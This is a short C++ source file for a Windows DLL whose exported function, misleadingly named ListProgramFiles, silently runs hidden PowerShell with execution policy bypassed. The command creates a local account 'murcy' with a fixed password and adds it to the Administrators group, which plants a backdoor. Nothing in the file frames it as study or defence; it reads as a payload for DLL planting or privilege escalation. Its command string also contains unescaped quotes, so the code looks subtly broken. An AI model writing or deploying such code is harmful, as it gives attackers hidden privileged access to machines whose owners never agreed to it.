#include <windows.h>

extern "C" __declspec(dllexport) void ListProgramFiles() {
    // PowerShell command line
    wchar_t cmd[] = L"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command \"New-LocalUser "murcy" -Password ("Password1!" | ConvertTo-SecureString -AsPlainText -Force) | Add-LocalGroupMember -Group "Administrators""";

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};

    // Hide console window if triggered from a GUI application
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(
            NULL,
            cmd,
            NULL,
            NULL,
            FALSE,
            CREATE_NO_WINDOW,
            NULL,
            NULL,
            &si,
            &pi)) {
        // Wait for PowerShell to finish executing
        WaitForSingleObject(pi.hProcess, INFINITE);
        
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    return TRUE;
}
